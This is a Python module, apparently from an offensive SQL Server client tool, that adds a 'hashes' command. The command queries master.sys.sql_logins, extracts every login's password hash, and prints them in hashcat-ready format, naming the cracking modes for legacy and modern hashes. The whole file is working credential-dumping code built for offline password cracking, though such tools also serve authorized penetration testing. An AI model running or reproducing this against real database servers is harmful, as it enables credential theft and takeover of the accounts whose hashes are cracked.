# mssqlclient_ng/core/actions/database/hashes.py

# Built-in imports
from typing import Any

# Third party imports
from loguru import logger

# Local library imports
from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext

@ActionFactory.register(
    "hashes",
    "Dump SQL Server login password hashes in hashcat format",
    aliases=["passwords"],
)
class Hashes(BaseAction):
    """
    Extract SQL Server login password hashes from master.sys.sql_logins.

    Hash formats:
      - SQL Server 2000-2008:  0x0100... -> hashcat mode 131
      - SQL Server 2012+:      0x0200... -> hashcat mode 1731

    Output format: username:0x<hash>  (hashcat compatible)

    Requires VIEW SERVER STATE or sysadmin role.
    Not available on Azure SQL Database.
    """

    def execute(
        self, database_context: DatabaseContext
    ) -> list[dict[str, Any]] | None:
        if database_context.query_service.is_azure_sql:
            logger.warning("Azure SQL Database does not expose password hashes")
            return None

        logger.info("Extracting SQL Server login password hashes")

        query = """
SELECT
    name AS LoginName,
    CONVERT(VARCHAR(MAX), password_hash, 1) AS PasswordHash
FROM master.sys.sql_logins
WHERE password_hash IS NOT NULL
  AND name NOT LIKE '##MS_%##'
ORDER BY name;"""

        try:
            rows = database_context.query_service.execute_table(query)
        except Exception as ex:
            msg = str(ex)
            if any(k in msg.lower() for k in ("permission", "denied", "select")):
                logger.error("Insufficient permissions to read sys.sql_logins")
                logger.error("Requires VIEW SERVER STATE or sysadmin role")
            else:
                logger.error(f"Failed to query password hashes: {msg}")
            return None

        if not rows:
            logger.warning("No SQL logins with password hashes found")
            return None

        has_legacy = False
        has_modern = False
        output_lines = []

        for row in rows:
            login_name = str(row.get("LoginName", ""))
            hash_val = str(row.get("PasswordHash", ""))

            if not hash_val or len(hash_val) < 6:
                continue

            # Normalise: strip leading 0x if present
            if hash_val.lower().startswith("0x"):
                hash_val = hash_val[2:]

            hash_type = hash_val[:4].upper()
            if hash_type == "0100":
                has_legacy = True
            elif hash_type == "0200":
                has_modern = True

            output_lines.append(f"{login_name}:0x{hash_val}")

        if not output_lines:
            logger.warning("No valid hashes extracted")
            return None

        print()
        print("\n".join(output_lines))
        print()

        if has_legacy:
            logger.info("Legacy SQL Server hashes (2000-2008 format, hashcat mode 131)")
        if has_modern:
            logger.info("Modern SQL Server hashes (2012+ format, hashcat mode 1731)")

        logger.success(f"Extracted {len(output_lines)} password hash(es)")
        return rows
